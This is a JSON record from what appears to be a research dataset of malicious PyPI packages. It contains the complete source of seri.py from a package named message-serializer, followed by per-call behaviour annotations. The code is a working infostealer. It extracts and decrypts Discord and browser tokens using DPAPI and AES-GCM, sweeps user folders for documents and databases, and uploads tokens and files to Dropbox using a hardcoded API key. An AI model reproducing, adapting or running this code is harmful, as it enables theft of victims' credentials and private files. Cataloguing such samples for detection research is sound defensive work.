{
  "metadata": {
    "package_name": "message-serializer-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/message-serializer-1.0.1.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "seri.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/message-serializer-1.0.1/message-serializer-1.0.1/message-serializer/seri.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport dropbox\nimport random\nimport base64\nimport re\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nimport json\n\nDROPBOX_API_KEY = \"sl.BZc1HBiCxfg7zp37mKXCrxL0S9ShjECf2b_yQyOWOkjjUiwQmlEXf5x5NutaZZYuCQbj0GlzFOmgGAQcZr2EKYtT6s8l32iC3Gxl72duXZDd_d4kx_sb_rddUWvGelPLORLVyt_S\"\n\ntry:\n    USER_PROFILE = os.environ[\"USERPROFILE\"]\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    if not os.path.exists(DESKTOP):\n        quit()\nexcept KeyError:\n    USER_PROFILE = None\n\ntry:\n    client = dropbox.Dropbox(DROPBOX_API_KEY)\nexcept:\n    quit()\n\nclass TokenGrabber:\n    def __init__(self):\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.tokens_sent = []\n        self.tokens = []\n\n    def decrypt_val(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    def get_master_key(self, path):\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def grab_tokens(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n        }\n\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \", \"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if file_name[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                self.tokens.append(token)\n\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        return self.tokens\n\ntokens = TokenGrabber().grab_tokens()\nif tokens:\n    file_name = str(random.randint(0, 500000)) + \"tokens39.txt\"\n    try:\n        client.files_upload(bytes(str(tokens).encode()), \"/home/\" + file_name)\n    except:\n        pass\n\nFILE_EXTENSIONS = [\".c\", \".cpp\", \".txt\", \".dll\", \".json\", \".csv\", \".sql\", \".db\"]\nSKIPPED_FILES = [\"DiscordChatExporter\", \"HotkeysConfig\"]\nSTORED_FILES = []\nLOW_PRIORITY_FILE_PATHS = []\nHIGH_PRIORITY_FILE_PATHS = []\nMAX_FILE_SIZE_ALLOWED = 52428800\nLOW_PRIORITY_FILE_SIZE = 5242880\n\n\ndef parse_all_files(path):\n    for (dirpath, dirnames, filenames) in os.walk(path):\n        for filename in filenames:\n            for file_extension in FILE_EXTENSIONS:\n                if filename.endswith(file_extension):\n                    filepath = os.sep.join([dirpath, filename])\n                    for skipped_file in SKIPPED_FILES:\n                        if skipped_file in filepath:\n                            continue\n                    STORED_FILES.append(filepath)\n\nif USER_PROFILE is not None:\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    DOCUMENTS = USER_PROFILE + \"\\\\Docudments\"\n    DOWNLOADS = USER_PROFILE + \"\\\\Downloads\"\n    SOURCE = USER_PROFILE + \"\\\\source\"\n\n    if os.path.exists(DESKTOP):\n        parse_all_files(DESKTOP)\n\n    if os.path.exists(DOCUMENTS):\n        parse_all_files(DOCUMENTS)\n\n    if os.path.exists(DOWNLOADS):\n        parse_all_files(DOWNLOADS)\n\n    if os.path.exists(SOURCE):\n        parse_all_files(SOURCE)\n\nfor file_path in STORED_FILES:\n    file_size = os.path.getsize(file_path)\n    if file_size > MAX_FILE_SIZE_ALLOWED:\n        continue\n    if file_size > LOW_PRIORITY_FILE_SIZE: \n        LOW_PRIORITY_FILE_PATHS.append(file_path)\n        continue\n    HIGH_PRIORITY_FILE_PATHS.append(file_path)\n\nUPLOADED_FILES = []\nindex = 0\nfor file_path in HIGH_PRIORITY_FILE_PATHS:\n    index += 1\n    f = open(file_path, \"rb\")\n    file_name = file_path.split(\"\\\\\")[-1]\n    file_name = str(index) + file_name\n    try:\n        client.files_upload(f.read(), \"/home/\" + file_name)\n        UPLOADED_FILES.append(file_name)\n    except:\n        pass\n    f.close()\n",
          "triple_sequences": [
            {
              "action_api": "os.environ[\"USERPROFILE\"]",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"USERPROFILE\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "DESKTOP",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "dropbox.Dropbox()",
              "action_description": "Creates HTTP connection to specified host",
              "action_id": "create_http_connection",
              "object": "DROPBOX_API_KEY",
              "object_description": "API key or token",
              "object_id": "api_key",
              "intention_description": "Connect to remote server",
              "intention_id": "connect_remote_server"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"localappdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"appdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt encrypted data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt encrypted data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode decrypted password",
              "intention_id": "decode_decrypted_password"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, \"r\", encoding=\"utf-8\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "c",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:], None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{file_name}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.readlines()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.encrypted_regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract encrypted Discord tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.roaming + f'\\{disc}\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State')",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt Discord token",
              "intention_id": "decrypt_discord_token"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{_file}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "random.randint()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "0, 500000",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "str(tokens)",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "bytes()",
              "action_description": "Creates bytes object from encoded string",
              "action_id": "create_bytes_encoded",
              "object": "str(tokens).encode()",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "client.files_upload()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "bytes(str(tokens).encode()), \"/home/\" + file_name",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.sep.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "[dirpath, filename]",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.path.getsize()",
              "action_description": "Retrieves disk usage statistics (total, used, free) for given path",
              "action_id": "get_disk_usage",
              "object": "file_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Get file size",
              "intention_id": "get_file_size"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_path, \"rb\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "client.files_upload()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f.read(), \"/home/\" + file_name",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            }
          ]
        }
      ]
    }
  ]
}